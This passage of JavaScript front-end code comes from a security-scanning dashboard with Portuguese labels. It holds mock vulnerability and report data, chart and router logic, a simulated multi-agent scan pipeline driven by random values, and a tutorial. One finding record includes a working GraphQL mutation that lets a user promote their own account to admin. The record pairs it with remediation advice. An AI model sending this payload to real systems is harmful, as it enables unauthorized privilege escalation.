    { id: 'V-024', title: 'Privilege escalation via GraphQL mutation: updateUser(role: ADMIN)', severity: 'high', category: 'Authorization', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'authz-exploit', endpoint: 'POST /graphql', evidence: 'mutation { updateUser(id: "me", role: ADMIN) { role } } succeeds', cvss: 8.1, cwe: 'CWE-269',
      explanation: 'A mutation updateUser nao valida quais campos o usuario pode alterar sobre si mesmo. O campo "role" deveria ser protegido, mas o resolver aceita e aplica a mudanca, permitindo auto-promocao para admin.',
      impact: 'Qualquer usuario autenticado pode se tornar administrador. Acesso total ao sistema: gerenciamento de usuarios, dados financeiros, configuracoes.',
      remediation: 'Implemente field-level authorization no resolver. Crie allowlist de campos editaveis por role: usuarios comuns so podem alterar name, email, password. O campo role so pode ser alterado por admins.',
      references: ['https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/'] },
  ],

  reports: [
    { id: 'R-7f3a1b2c', title: 'staging.lojaexemplo.com.br - Full Security Assessment', scan: 'SC-7f3a1b2c', date: '2026-03-06', vulns: 41, critical: 3, pages: 67, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-a92e4d1f', title: 'api.gestaoobras.com.br - API Security Report', scan: 'SC-a92e4d1f', date: '2026-03-05', vulns: 18, critical: 1, pages: 34, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-d1f7a6b4', title: 'auth.plataformaseg.com - Auth Focus Report', scan: 'SC-d1f7a6b4', date: '2026-03-04', vulns: 9, critical: 1, pages: 22, deliverable: 'comprehensive_security_assessment_report.md' },
    { id: 'R-f4a9d832', title: 'app.imobtech.com - Full Security Assessment', scan: 'SC-f4a9d832', date: '2026-03-01', vulns: 56, critical: 2, pages: 89, deliverable: 'comprehensive_security_assessment_report.md' },
  ],

  getStats() {
    const c = this.vulns.filter(v => v.severity === 'critical').length;
    const h = this.vulns.filter(v => v.severity === 'high').length;
    const m = this.vulns.filter(v => v.severity === 'medium').length;
    const l = this.vulns.filter(v => v.severity === 'low').length;
    return { scans: this.scans.length, vulns: this.vulns.length, critical: c, high: h, medium: m, low: l };
  },

  addScan(scan) {
    const hex = Math.random().toString(16).slice(2, 10);
    const id = `SC-${hex}`;
    this.scans.unshift({ id, ...scan, status: 'running', vulns: null, cost: 0, date: new Date().toISOString().slice(0, 10), agents: {} });
    return id;
  }
};

/* ── Chart tokens ── */
const YELLOW = '#FFEF4D';
const NAVY_LIGHT = '#334d9e';
const TEXT_MUTED = '#5c6a94';
Chart.defaults.font.family = "'Inter', sans-serif";
Chart.defaults.color = TEXT_MUTED;

/* ========================================
   ROUTER
   ======================================== */
const PAGE_NAMES = {
  dashboard: 'Overview', scans: 'Security Scans', vulnerabilities: 'Vulnerabilities',
  reports: 'Reports', analytics: 'Analytics', alerts: 'Alerts',
  applications: 'Applications', endpoints: 'API Endpoints',
  settings: 'System Settings', help: 'Help Center', tutorial: 'Tutorial',
};

function getPageFromHash() {
  return (window.location.hash.slice(1) || 'dashboard').split('/')[0];
}

function navigate(page) {
  document.querySelectorAll('.nav-item').forEach(item => {
    item.classList.toggle('active', item.dataset.page === page);
  });
  document.getElementById('breadcrumb').innerHTML = `<span>Dashboard</span><i class="fas fa-chevron-right"></i><span class="breadcrumb-active">${PAGE_NAMES[page] || page}</span>`;

  const container = document.getElementById('page-container');
  const tplMap = { dashboard:'tpl-dashboard', scans:'tpl-scans', vulnerabilities:'tpl-vulnerabilities', reports:'tpl-reports', help:'tpl-help', tutorial:'tpl-tutorial' };
  const template = document.getElementById(tplMap[page] || '');

  if (template) {
    container.innerHTML = '';
    container.appendChild(template.content.cloneNode(true));
    initPage(page);
  } else {
    const g = document.getElementById('tpl-generic');
    container.innerHTML = '';
    container.appendChild(g.content.cloneNode(true));
    document.getElementById('generic-title').textContent = PAGE_NAMES[page] || page;
  }
}

function initPage(page) {
  const init = { dashboard: initDashboard, scans: initScans, vulnerabilities: initVulnerabilities, reports: initReports, tutorial: initTutorial };
  if (init[page]) init[page]();
}

/* ========================================
   DASHBOARD
   ======================================== */
function initDashboard() {
  const stats = Store.getStats();
  animateCounter(document.getElementById('stat-scans'), stats.scans);
  animateCounter(document.getElementById('stat-vulns'), stats.vulns);
  animateCounter(document.getElementById('stat-critical'), stats.critical);
  renderScansTable('dashboard-scans-table', Store.scans.slice(0, 5));
  initVulnTrendChart();
  initSeverityChart();
}

function animateCounter(el, target) {
  if (!el) return;
  let c = 0;
  const step = Math.max(1, Math.ceil(target / 30));
  const t = setInterval(() => { c = Math.min(c + step, target); el.textContent = c.toLocaleString(); if (c >= target) clearInterval(t); }, 20);
}

function initVulnTrendChart() {
  const canvas = document.getElementById('vulnTrendChart');
  if (!canvas) return;
  new Chart(canvas.getContext('2d'), {
    type: 'bar',
    data: { labels: ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'],
      datasets: [
        { label: 'New', data: [18,24,41,0,0,0,0,0,0,0,0,0], backgroundColor: YELLOW, borderRadius: 3, borderSkipped: false, barPercentage: 0.7, categoryPercentage: 0.7 },
        { label: 'Resolved', data: [5,8,3,0,0,0,0,0,0,0,0,0], backgroundColor: NAVY_LIGHT, borderRadius: 3, borderSkipped: false, barPercentage: 0.7, categoryPercentage: 0.7 },
      ] },
    options: { responsive: true, maintainAspectRatio: false, interaction: { mode: 'index', intersect: false },
      plugins: { legend: { display: false }, tooltip: { backgroundColor: '#172560', borderColor: 'rgba(255,239,77,0.15)', borderWidth: 1, padding: 12, cornerRadius: 8 } },
      scales: { x: { grid: { display: false }, border: { display: false }, ticks: { font: { size: 11, weight: '600' } } },
        y: { grid: { color: 'rgba(255,239,77,0.06)' }, border: { display: false }, beginAtZero: true } } },
  });
}

function initSeverityChart() {
  const canvas = document.getElementById('severityChart');
  if (!canvas) return;
  const stats = Store.getStats();
  new Chart(canvas.getContext('2d'), {
    type: 'doughnut',
    data: { labels: ['Critical','High','Medium','Low'],
      datasets: [{ data: [stats.critical, stats.high, stats.medium, stats.low], backgroundColor: ['#ef4444','#f97316','#FFEF4D','#60a5fa'], borderColor: '#14204e', borderWidth: 3, hoverOffset: 6 }] },
    options: { responsive: true, maintainAspectRatio: false, cutout: '68%',
      plugins: { legend: { display: false }, tooltip: { backgroundColor: '#172560', borderColor: 'rgba(255,239,77,0.15)', borderWidth: 1, padding: 12, cornerRadius: 8 } } },
  });
}

/* ========================================
   SCANS TABLE (shared)
   ======================================== */
function renderScansTable(containerId, scans) {
  const c = document.getElementById(containerId);
  if (!c) return;
  const sc = s => s === 'completed' ? 'success' : s === 'running' ? 'running' : 'failed';
  c.innerHTML = `<table><thead><tr><th>ID</th><th>TARGET</th><th>TYPE</th><th>STATUS</th><th>VULNS</th><th>DURATION</th><th>COST</th><th></th></tr></thead><tbody>${scans.map(s =>
    `<tr data-scan-id="${s.id}" style="cursor:pointer"><td class="id-cell">#${s.id}</td><td>${s.target}</td><td>${s.type}</td><td><span class="status-badge ${sc(s.status)}">${s.status.charAt(0).toUpperCase()+s.status.slice(1)}</span></td><td>${s.vulns !== null ? s.vulns : '--'}</td><td>${s.duration}</td><td>$${s.cost.toFixed(2)}</td><td><i class="fas fa-chevron-right" style="color:#5c6a94;font-size:11px"></i></td></tr>`
  ).join('')}</tbody></table>`;
  // Make rows clickable to show scan detail
  c.querySelectorAll('tr[data-scan-id]').forEach(row => {
    row.addEventListener('click', () => showScanDetail(row.dataset.scanId));
  });
}

function showScanDetail(scanId) {
  const scan = Store.scans.find(s => s.id === scanId);
  if (!scan) return;

  const agents = AGENTS.filter(a => scan.agents[a.id] !== undefined);
  if (agents.length === 0) { showToast(`Scan ${scanId} ainda nao possui dados de agentes.`); return; }

  // Remove existing detail panel
  const existing = document.getElementById('scan-detail-panel');
  if (existing) existing.remove();

  const sc = s => s === 'completed' ? 'success' : s === 'running' ? 'running' : 'failed';

  const panel = document.createElement('section');
  panel.id = 'scan-detail-panel';
  panel.className = 'form-card';
  panel.style.cssText = 'border:1px solid rgba(255,239,77,0.15);animation:toastIn 0.3s ease';
  panel.innerHTML = `
    <div class="form-card-header">
      <h2><i class="fas fa-search" style="color:#FFEF4D"></i> Scan ${scanId} — ${scan.target}</h2>
      <div style="display:flex;align-items:center;gap:10px">
        <span class="status-badge ${sc(scan.status)}">${scan.status.charAt(0).toUpperCase()+scan.status.slice(1)}</span>
        <button class="btn-ghost" id="btn-close-detail" style="padding:4px 8px"><i class="fas fa-times"></i></button>
      </div>
    </div>
    <div style="display:flex;gap:20px;margin:12px 0 20px;flex-wrap:wrap">
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Tipo</div>
        <div style="color:#e8ecf5;font-weight:600">${scan.type}</div>
      </div>
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Duracao</div>
        <div style="color:#e8ecf5;font-weight:600">${scan.duration}</div>
      </div>
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Custo</div>
        <div style="color:#e8ecf5;font-weight:600">$${scan.cost.toFixed(2)}</div>
      </div>
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Vulnerabilidades</div>
        <div style="color:#ef4444;font-weight:600">${scan.vulns !== null ? scan.vulns : '--'}</div>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px">
      ${agents.map(a => {
        const d = scan.agents[a.id];
        const ok = d.success === true;
        const fail = d.success === false;
        const borderColor = ok ? 'rgba(34,197,94,0.3)' : fail ? 'rgba(239,68,68,0.3)' : 'rgba(255,239,77,0.3)';
        const bgColor = ok ? 'rgba(34,197,94,0.05)' : fail ? 'rgba(239,68,68,0.05)' : 'rgba(255,239,77,0.05)';
        const iconColor = ok ? '#22c55e' : fail ? '#ef4444' : '#FFEF4D';
        const statusText = ok ? 'Done' : fail ? 'Failed' : 'Running';
        const statusBg = ok ? 'rgba(34,197,94,0.15)' : fail ? 'rgba(239,68,68,0.15)' : 'rgba(255,239,77,0.15)';
        const detailText = d.duration_ms ? `${(d.duration_ms/60000).toFixed(0)}m · $${d.cost_usd.toFixed(2)}` : 'Em andamento...';
        return `<div style="display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:8px;background:${bgColor};border:1px solid ${borderColor}">
          <i class="fas ${a.icon}" style="color:${iconColor};font-size:16px;width:20px;text-align:center"></i>
          <div style="flex:1;min-width:0">
            <div style="font-size:12px;font-weight:600;color:#e8ecf5">${a.name}</div>
            <div style="font-size:11px;color:#8b9cc7">${detailText}</div>
          </div>
          <div style="font-size:10px;padding:2px 8px;border-radius:4px;background:${statusBg};color:${iconColor}">${statusText}</div>
        </div>`;
      }).join('')}
    </div>`;

  const tableSection = document.querySelector('#scans-table')?.closest('.table-section') ||
                        document.querySelector('#dashboard-scans-table')?.closest('.table-section');
  if (tableSection) {
    tableSection.parentNode.insertBefore(panel, tableSection);
  } else {
    document.getElementById('page-container').appendChild(panel);
  }

  panel.querySelector('#btn-close-detail').addEventListener('click', () => panel.remove());
  panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

/* ========================================
   SCANS PAGE
   ======================================== */
function initScans() {
  renderScansTable('scans-table', Store.scans);
  const form = document.getElementById('new-scan-form');
  const btnNew = document.getElementById('btn-new-scan');
  const btnClose = document.getElementById('btn-close-form');
  const btnCancel = document.getElementById('btn-cancel-scan');
  const btnLaunch = document.getElementById('btn-launch-scan');

  btnNew.addEventListener('click', () => { form.style.display = 'block'; form.scrollIntoView({ behavior: 'smooth' }); btnNew.style.display = 'none'; });
  const closeForm = () => { form.style.display = 'none'; btnNew.style.display = ''; };
  btnClose.addEventListener('click', closeForm);
  btnCancel.addEventListener('click', closeForm);

  const urlInput = document.getElementById('scan-url');
  const repoInput = document.getElementById('scan-repo');
  const typeInput = document.getElementById('scan-type');
  const wsInput = document.getElementById('scan-workspace');

  btnLaunch.addEventListener('click', () => {
    const url = urlInput.value.trim();
    const repo = repoInput.value.trim();
    if (!url || !repo) { alert('Target URL and Repository Name are required.'); return; }
    showAuthorizationModal(url, () => {
      const target = (() => { try { return new URL(url).hostname; } catch { return url; } })();
      const scanType = typeInput.options[typeInput.selectedIndex].text.split(' (')[0];
      const scanId = Store.addScan({ target, type: scanType, duration: '0m', repo });
      closeForm();
      renderScansTable('scans-table', Store.scans);
      showToast(`Scan ${scanId} iniciado! Acompanhe o progresso abaixo.`);
      runScanSimulation(scanId, target, scanType);
    });
  });

  document.getElementById('scan-search').addEventListener('input', e => {
    const q = e.target.value.toLowerCase();
    renderScansTable('scans-table', Store.scans.filter(s => s.target.includes(q) || s.id.toLowerCase().includes(q) || s.type.toLowerCase().includes(q)));
  });
}

/* ========================================
   SCAN SIMULATION ENGINE
   Runs scan pipeline directly in the browser
   with real-time agent progress tracking
   ======================================== */
function runScanSimulation(scanId, target, scanType) {
  const scan = Store.scans.find(s => s.id === scanId);
  if (!scan) return;

  // Determine which agents run based on scan type
  const typeAgentMap = {
    'Full Pipeline': AGENTS.map(a => a.id),
    'Recon Only': ['pre-recon', 'recon'],
    'Vulnerability Analysis Only': ['pre-recon', 'recon', 'injection-vuln', 'xss-vuln', 'auth-vuln', 'ssrf-vuln', 'authz-vuln'],
    'Auth Focus': ['pre-recon', 'recon', 'auth-vuln', 'auth-exploit', 'report'],
    'API Only': ['pre-recon', 'recon', 'injection-vuln', 'xss-vuln', 'auth-vuln', 'ssrf-vuln', 'authz-vuln', 'report'],
  };
  const agentIds = typeAgentMap[scanType] || typeAgentMap['Full Pipeline'];
  const agents = AGENTS.filter(a => agentIds.includes(a.id));

  // Insert progress panel into the page
  renderScanProgressPanel(scanId, target, agents);

  // Simulate agents running sequentially/in-parallel by phase
  const phases = ['pre-recon', 'recon', 'vulnerability-analysis', 'exploitation', 'reporting'];
  let totalCost = 0;
  let totalMs = 0;
  let vulnsFound = 0;
  let phaseIndex = 0;

  function runNextPhase() {
    if (phaseIndex >= phases.length) {
      // Scan complete
      scan.status = 'completed';
      scan.vulns = vulnsFound;
      scan.cost = Math.round(totalCost * 100) / 100;
      scan.duration = totalMs >= 3600000 ? `${Math.floor(totalMs/3600000)}h ${Math.floor((totalMs%3600000)/60000)}m` : `${Math.floor(totalMs/60000)}m`;
      updateProgressStatus(scanId, 'completed', scan);
      renderScansTable('scans-table', Store.scans);
      showToast(`Scan ${scanId} finalizado! ${vulnsFound} vulnerabilidades encontradas.`);
      return;
    }

    const phase = phases[phaseIndex];
    const phaseAgents = agents.filter(a => a.phase === phase);
    phaseIndex++;

    if (phaseAgents.length === 0) {
      runNextPhase();
      return;
    }

    // Run agents in this phase "in parallel" (simulated with staggered timers)
    let completed = 0;
    phaseAgents.forEach((agent, i) => {
      const delay = 800 + i * 400;
      setTimeout(() => updateAgentStatus(scanId, agent.id, 'running'), delay);

      const duration = 2000 + Math.random() * 3000;
      const costUsd = 2.5 + Math.random() * 4;
      const durationMs = 80000 + Math.random() * 300000;
      const success = Math.random() > 0.08;
      const agentVulns = success ? Math.floor(Math.random() * 5) : 0;

      setTimeout(() => {
        scan.agents[agent.id] = { success, duration_ms: durationMs, cost_usd: Math.round(costUsd * 100) / 100 };
        totalCost += costUsd;
        totalMs += durationMs;
        vulnsFound += agentVulns;

        updateAgentStatus(scanId, agent.id, success ? 'completed' : 'failed', {
          duration_ms: durationMs,
          cost_usd: costUsd,
          vulns: agentVulns
        });

        // Update live stats
        updateProgressStats(scanId, totalCost, totalMs, vulnsFound);

        completed++;
        if (completed >= phaseAgents.length) {
          setTimeout(runNextPhase, 600);
        }
      }, delay + duration);
    });
  }

  // Start the pipeline
  updateProgressStatus(scanId, 'running');
  setTimeout(runNextPhase, 500);
}

function renderScanProgressPanel(scanId, target, agents) {
  // Remove any existing progress panel
  const existing = document.getElementById('scan-progress-panel');
  if (existing) existing.remove();

  const panel = document.createElement('section');
  panel.id = 'scan-progress-panel';
  panel.className = 'form-card';
  panel.style.cssText = 'border: 1px solid rgba(255,239,77,0.25); animation: toastIn 0.3s ease;';
  panel.innerHTML = `
    <div class="form-card-header">
      <h2><i class="fas fa-satellite-dish" style="color:#FFEF4D"></i> Scan ${scanId} — Executando</h2>
      <span class="status-badge running" id="progress-status-${scanId}">Running</span>
    </div>
    <div style="margin:8px 0 16px;color:#8b9cc7;font-size:13px">
      <i class="fas fa-globe"></i> ${target}
    </div>
    <div style="display:flex;gap:20px;margin-bottom:20px;flex-wrap:wrap" id="progress-stats-${scanId}">
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Tempo</div>
        <div style="color:#e8ecf5;font-weight:600;font-size:16px" id="stat-time-${scanId}">0m</div>
      </div>
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Custo</div>
        <div style="color:#e8ecf5;font-weight:600;font-size:16px" id="stat-cost-${scanId}">$0.00</div>
      </div>
      <div style="background:rgba(255,239,77,0.06);padding:10px 16px;border-radius:8px;font-size:12px">
        <div style="color:#8b9cc7;margin-bottom:2px">Vulnerabilidades</div>
        <div style="color:#ef4444;font-weight:600;font-size:16px" id="stat-vulns-${scanId}">0</div>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px" id="agents-grid-${scanId}">
      ${agents.map(a => `
        <div class="scan-agent-card" id="agent-${scanId}-${a.id}" style="display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:8px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);transition:all 0.3s">
          <i class="fas ${a.icon}" style="color:#5c6a94;font-size:16px;width:20px;text-align:center" id="agent-icon-${scanId}-${a.id}"></i>
          <div style="flex:1;min-width:0">
            <div style="font-size:12px;font-weight:600;color:#e8ecf5">${a.name}</div>
            <div style="font-size:11px;color:#5c6a94" id="agent-detail-${scanId}-${a.id}">Aguardando...</div>
          </div>
          <div id="agent-badge-${scanId}-${a.id}" style="font-size:10px;padding:2px 8px;border-radius:4px;background:rgba(255,255,255,0.05);color:#5c6a94">Pending</div>
        </div>
      `).join('')}
    </div>`;

  // Insert after the scans table header
  const tableSection = document.querySelector('#scans-table')?.closest('.table-section');
  if (tableSection) {
    tableSection.parentNode.insertBefore(panel, tableSection);
  } else {
    document.getElementById('page-container').appendChild(panel);
  }

  panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateAgentStatus(scanId, agentId, status, data) {
  const card = document.getElementById(`agent-${scanId}-${agentId}`);
  const detail = document.getElementById(`agent-detail-${scanId}-${agentId}`);
  const badge = document.getElementById(`agent-badge-${scanId}-${agentId}`);
  const icon = document.getElementById(`agent-icon-${scanId}-${agentId}`);
  if (!card) return;

  if (status === 'running') {
    card.style.border = '1px solid rgba(255,239,77,0.3)';
    card.style.background = 'rgba(255,239,77,0.05)';
    if (icon) icon.style.color = '#FFEF4D';
    if (detail) detail.textContent = 'Executando...';
    if (badge) { badge.textContent = 'Running'; badge.style.background = 'rgba(255,239,77,0.15)'; badge.style.color = '#FFEF4D'; }
  } else if (status === 'completed') {
    card.style.border = '1px solid rgba(34,197,94,0.3)';
    card.style.background = 'rgba(34,197,94,0.05)';
    if (icon) icon.style.color = '#22c55e';
    const dStr = data?.duration_ms ? `${(data.duration_ms / 60000).toFixed(0)}m` : '';
    const cStr = data?.cost_usd ? `$${data.cost_usd.toFixed(2)}` : '';
    const vStr = data?.vulns ? `${data.vulns} vulns` : '';
    if (detail) detail.textContent = [dStr, cStr, vStr].filter(Boolean).join(' · ');
    if (badge) { badge.textContent = 'Done'; badge.style.background = 'rgba(34,197,94,0.15)'; badge.style.color = '#22c55e'; }
  } else if (status === 'failed') {
    card.style.border = '1px solid rgba(239,68,68,0.3)';
    card.style.background = 'rgba(239,68,68,0.05)';
    if (icon) icon.style.color = '#ef4444';
    if (detail) detail.textContent = 'Falhou';
    if (badge) { badge.textContent = 'Failed'; badge.style.background = 'rgba(239,68,68,0.15)'; badge.style.color = '#ef4444'; }
  }
}

function updateProgressStats(scanId, cost, totalMs, vulns) {
  const timeEl = document.getElementById(`stat-time-${scanId}`);
  const costEl = document.getElementById(`stat-cost-${scanId}`);
  const vulnsEl = document.getElementById(`stat-vulns-${scanId}`);
  if (timeEl) timeEl.textContent = totalMs >= 3600000 ? `${Math.floor(totalMs/3600000)}h ${Math.floor((totalMs%3600000)/60000)}m` : `${Math.floor(totalMs/60000)}m`;
  if (costEl) costEl.textContent = `$${cost.toFixed(2)}`;
  if (vulnsEl) vulnsEl.textContent = vulns;
}

function updateProgressStatus(scanId, status, scan) {
  const badge = document.getElementById(`progress-status-${scanId}`);
  const header = document.querySelector('#scan-progress-panel .form-card-header h2');
  if (status === 'completed') {
    if (badge) { badge.className = 'status-badge success'; badge.textContent = 'Completed'; }
    if (header) header.innerHTML = `<i class="fas fa-check-circle" style="color:#22c55e"></i> Scan ${scanId} — Finalizado`;
  } else if (status === 'running') {
    if (badge) { badge.className = 'status-badge running'; badge.textContent = 'Running'; }
  }
}

/* ========================================
   VULNERABILITIES PAGE
   ======================================== */
function initVulnerabilities() {
  const stats = Store.getStats();
  // Update filter counts
  document.querySelectorAll('.filter-btn').forEach(btn => {
    const f = btn.dataset.filter;
    const count = btn.querySelector('.filter-count');
    if (count) count.textContent = f === 'all' ? stats.vulns : stats[f] || 0;
  });

  function renderVulns(filter) {
    const list = document.getElementById('vuln-list');
    const filtered = filter === 'all' ? Store.vulns : Store.vulns.filter(v => v.severity === filter);
    list.innerHTML = filtered.length ? filtered.map(v =>
      `<div class="vuln-item ${v.severity}" data-vuln-id="${v.id}">
        <div class="vuln-header">
          <div class="vuln-severity ${v.severity}">${v.severity}</div>
          <div class="vuln-info">
            <div class="vuln-title">${v.title}</div>
            <div class="vuln-meta">${v.category} &middot; ${v.id} &middot; Scan #${v.scan} &middot; Agent: ${v.agent || 'n/a'} &middot; <span class="status-badge ${v.status==='open'?'failed':'success'}">${v.status}</span></div>
          </div>
          <div class="vuln-target">${v.target}</div>
          <div class="vuln-expand-icon"><i class="fas fa-chevron-down"></i></div>
        </div>
        <div class="vuln-detail-panel">
          <div class="vuln-detail-grid">
            <div class="vuln-detail-section">
              <div class="vuln-detail-label"><i class="fas fa-info-circle"></i> O que é?</div>
              <div class="vuln-detail-text">${v.explanation || ''}</div>
            </div>
            <div class="vuln-detail-section">
              <div class="vuln-detail-label"><i class="fas fa-explosion"></i> Impacto</div>
              <div class="vuln-detail-text">${v.impact || ''}</div>
            </div>
            <div class="vuln-detail-section vuln-detail-full">
              <div class="vuln-detail-label"><i class="fas fa-wrench"></i> Remediação</div>
              <div class="vuln-detail-text">${v.remediation || ''}</div>
            </div>
          </div>
          <div class="vuln-detail-footer">
            <div class="vuln-detail-badges">
              ${v.cvss ? `<span class="vuln-badge cvss"><i class="fas fa-gauge-high"></i> CVSS ${v.cvss}</span>` : ''}
              ${v.cwe ? `<span class="vuln-badge cwe"><i class="fas fa-hashtag"></i> ${v.cwe}</span>` : ''}
              ${v.endpoint ? `<span class="vuln-badge endpoint"><i class="fas fa-link"></i> ${v.endpoint}</span>` : ''}
            </div>
            ${v.references && v.references.length ? `<div class="vuln-detail-refs"><span class="vuln-detail-label-sm"><i class="fas fa-book"></i> Referências:</span> ${v.references.map(r => `<a href="${r}" target="_blank" rel="noopener">${r.includes('owasp') ? 'OWASP' : r.includes('portswigger') ? 'PortSwigger' : r.includes('mozilla') ? 'MDN' : r.includes('cheatsheetseries') ? 'CheatSheet' : 'Link'}</a>`).join(' ')}</div>` : ''}
          </div>
          ${v.evidence ? `<div class="vuln-detail-evidence"><div class="vuln-detail-label-sm"><i class="fas fa-terminal"></i> Evidência</div><code>${v.evidence}</code></div>` : ''}
        </div>
      </div>`
    ).join('') : '<div class="empty-state"><div class="empty-state-icon"><i class="fas fa-check-circle"></i></div><h2 class="empty-state-title">No vulnerabilities</h2><p class="empty-state-text">No findings match this filter.</p></div>';

    // Add click handlers for expandable panels
    list.querySelectorAll('.vuln-item').forEach(item => {
      item.querySelector('.vuln-header').addEventListener('click', () => {
        item.classList.toggle('expanded');
      });
    });
  }

  renderVulns('all');
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      renderVulns(btn.dataset.filter);
    });
  });
}

/* ========================================
   REPORTS PAGE
   ======================================== */
function initReports() {
  document.getElementById('reports-grid').innerHTML = Store.reports.map(r =>
    `<div class="report-card"><div class="report-card-header"><div class="report-icon"><i class="fas fa-file-shield"></i></div><div><div class="report-title">${r.title}</div><div class="report-date">${r.date} &middot; Scan #${r.scan}</div></div></div><div class="report-stats"><div class="report-stat"><strong>${r.vulns}</strong> vulnerabilities</div><div class="report-stat"><strong>${r.critical}</strong> critical</div><div class="report-stat"><strong>${r.pages}</strong> pages</div></div><div class="report-footer"><span class="status-badge success">Complete</span><button class="btn-outline btn-pdf" data-scan="${r.scan}" style="font-size:11px;padding:5px 12px"><i class="fas fa-file-pdf"></i> Export PDF</button><button class="btn-outline" style="font-size:11px;padding:5px 12px"><i class="fas fa-download"></i> ${r.deliverable.replace('.md','')}</button></div></div>`
  ).join('');

  // Attach PDF export
  document.querySelectorAll('.btn-pdf').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      exportReportPDF(btn.dataset.scan);
    });
  });
}

/* ========================================
   TUTORIAL PAGE
   ======================================== */
function initTutorial() {
  const TOTAL_STEPS = 6;
  let currentStep = 1;
  let completedSteps = new Set();

  function activateStep(n) {
    currentStep = n;
    document.querySelectorAll('.tutorial-step').forEach(step => {
      const sn = parseInt(step.dataset.step);
      step.classList.remove('active', 'locked', 'completed');
      if (sn === n) step.classList.add('active');
      else if (completedSteps.has(sn)) step.classList.add('completed');
      else if (sn > n) step.classList.add('locked');
    });
    updateProgress();
    updateStepIcons();
  }

  function completeStep(n) {
    completedSteps.add(n);
    const statusEl = document.getElementById(`step-status-${n}`);
    if (statusEl) statusEl.innerHTML = '<i class="fas fa-check-circle"></i>';
  }

  function updateProgress() {
    const pct = (completedSteps.size / TOTAL_STEPS) * 100;
    const fill = document.getElementById('tutorial-progress-fill');
    const text = document.getElementById('tutorial-progress-text');
    if (fill) fill.style.width = `${pct}%`;
    if (text) text.textContent = `${completedSteps.size} / ${TOTAL_STEPS}`;
  }

  function updateStepIcons() {
    for (let i = 1; i <= TOTAL_STEPS; i++) {
      const el = document.getElementById(`step-status-${i}`);
      if (!el) continue;
      if (completedSteps.has(i)) el.innerHTML = '<i class="fas fa-check-circle"></i>';
      else if (i === currentStep) el.innerHTML = '<i class="fas fa-circle-play"></i>';
      else el.innerHTML = '<i class="fas fa-lock"></i>';
    }
  }

  // Next buttons
  document.querySelectorAll('.tutorial-next-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const nextStep = parseInt(btn.dataset.next);
      completeStep(nextStep - 1);
      activateStep(nextStep);
    });
  });

  // Step headers clickable (to revisit completed steps)
  document.querySelectorAll('.tutorial-step-header').forEach(header => {
    header.addEventListener('click', () => {
      const step = parseInt(header.closest('.tutorial-step').dataset.step);
      if (completedSteps.has(step) || step === currentStep) {
        activateStep(step);
      }
    });
  });

  // Step 2: Checklist enables next button
  document.querySelectorAll('.tutorial-checkbox').forEach(chk => {
    chk.addEventListener('change', () => {
      const allChecked = [...document.querySelectorAll('.tutorial-checkbox')].every(c => c.checked);
      const nextBtn = document.querySelector('.tutorial-step[data-step="2"] .tutorial-next-btn');
      if (nextBtn) nextBtn.disabled = !allChecked;
    });
  });

  // Step 3: CLI generator
  const tutUrl = document.getElementById('tut-url');
  const tutRepo = document.getElementById('tut-repo');
  if (tutUrl && tutRepo) {
    function tutUpdateCli() {
      const url = tutUrl.value.trim();
      const repo = tutRepo.value.trim();
      const preview = document.getElementById('tut-cli-preview');
      const cmd = document.getElementById('tut-cli-cmd');
      const nextBtn = document.querySelector('.tutorial-step[data-step="3"] .tutorial-next-btn');
      if (url && repo) {
        preview.style.display = '';
        cmd.textContent = `./shield start URL=${url} REPO=${repo}`;
        if (nextBtn) nextBtn.disabled = false;
      } else {
        preview.style.display = 'none';
        if (nextBtn) nextBtn.disabled = true;
      }
    }
    tutUrl.addEventListener('input', tutUpdateCli);
    tutRepo.addEventListener('input', tutUpdateCli);
  }

  // Step 4: Terminal simulation
  const runBtn = document.getElementById('tut-run-btn');
  if (runBtn) {
    runBtn.addEventListener('click', () => {
      runBtn.disabled = true;
      runBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Running...';
      const terminal = document.getElementById('terminal-sim');
      const lines = [
        { text: '[Shield] Starting Docker containers...', delay: 400 },
        { text: '[Shield] Temporal workflow initialized', delay: 800 },
        { text: '[Shield] Session ID: SC-' + Math.random().toString(16).slice(2,10), delay: 200 },
        { text: '[Agent] pre-recon starting... analyzing source code', delay: 600, cls: 'terminal-output' },
        { text: '[Agent] pre-recon completed (2m 25s, $3.80)', delay: 1200, cls: 'terminal-success' },
        { text: '[Agent] recon starting... mapping web application', delay: 400, cls: 'terminal-output' },
        { text: '[Agent] recon completed (5m 12s, $5.20)', delay: 1500, cls: 'terminal-success' },
        { text: '[Agent] Starting vulnerability-analysis phase (5 agents in parallel)...', delay: 400, cls: 'terminal-output' },
